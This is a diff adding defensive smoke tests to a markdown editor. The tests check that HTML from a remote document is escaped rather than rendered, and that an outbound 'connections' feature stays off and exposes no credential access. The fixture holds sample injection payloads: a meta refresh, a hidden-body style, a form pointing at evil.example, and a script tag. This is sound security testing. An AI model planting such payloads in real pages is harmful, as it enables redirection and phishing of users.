@@ -249,6 +249,69 @@
     check("the update checks ran without throwing", false, err.message);
   }
 
+  /* A document from a connection must not put raw HTML into the page.
+
+     This runs at the DOM, through the real load-and-render path, because the
+     bug it guards against was precisely a safe renderer that existed, was
+     exported, was unit-tested, and was never called by the app. Testing the
+     helper proved nothing; this puts a hostile document on the screen and
+     looks at what came out. No connection is needed — a document is remote
+     because its handle says so. */
+  try {
+    const ed = await import("./js/editor.js");
+    const nasty = [
+      "# Innocent looking note", "",
+      '<meta http-equiv="refresh" content="0;url=https://evil.example">', "",
+      "<style>body{display:none}</style>", "",
+      '<form action="https://evil.example" method="get"><input name=x></form>', "",
+      "<script>window.stolen = 1</script>"
+    ].join("\n");
+
+    ed.loadText(nasty, "Hostile.md", {
+      path: null, mtime: 0,
+      remote: { connectionId: "c", remoteId: "r", version: "1", writable: false, label: "Hostile" }
+    });
+    await wait(120);
+    const rendered = [...document.querySelectorAll("#paper .rendered")].map(n => n.innerHTML).join("\n");
+    check("a remote document renders as untrusted", md.isUntrusted());
+    for (const tag of ["<meta", "<style", "<form", "<script"]) {
+      check("raw " + tag + "> is kept out of the page", !rendered.toLowerCase().includes(tag),
+        rendered.slice(0, 160));
+    }
+    check("the markup is shown as text rather than dropped", rendered.includes("&lt;meta"));
+    check("nothing executed", typeof window.stolen === "undefined");
+
+    /* and a note of the user's own still keeps its HTML — this is markdown */
+    ed.loadText("<div class=\"mine\">hello</div>", "Mine.md", { path: "/tmp/Mine.md", mtime: 0, remote: null });
+    await wait(120);
+    check("a local note keeps its own html", !md.isUntrusted() &&
+      document.querySelector("#paper .rendered div.mine") !== null);
+  } catch (err) {
+    check("the remote-render checks ran without throwing", false, err.message);
+  }
+
+  /* Connections. The smoke run boots without --connections, so this is the
+     check that the feature really is dark: the bridge is present but says no,
+     the list is empty, and nothing can be reached through it. A regression
+     here means a build shipped with an outbound feature switched on. */
+  try {
+    check("connections bridge exposed", !!window.inkju.connections);
+    check("connections are off without the flag", (await window.inkju.connections.enabled()) === false);
+    const list = await window.inkju.connections.list();
+    check("no connections are configured", Array.isArray(list) && list.length === 0,
+      JSON.stringify(list));
+    let refused = false;
+    try { await window.inkju.connections.add({ label: "x", transport: "http", config: { url: "https://example.com/mcp" } }); }
+    catch (err) { refused = /not enabled/i.test(err.message); }
+    check("a connection cannot be added while the feature is off", refused);
+    /* and the bridge hands out no way to reach a credential */
+    check("the bridge exposes no credential reader",
+      typeof window.inkju.connections.secret === "undefined" &&
+      typeof window.inkju.connections.tokens === "undefined");
+  } catch (err) {
+    check("the connection checks ran without throwing", false, err.message);
+  }
+
   return {
     failures,
     checks: ran - failures.length,
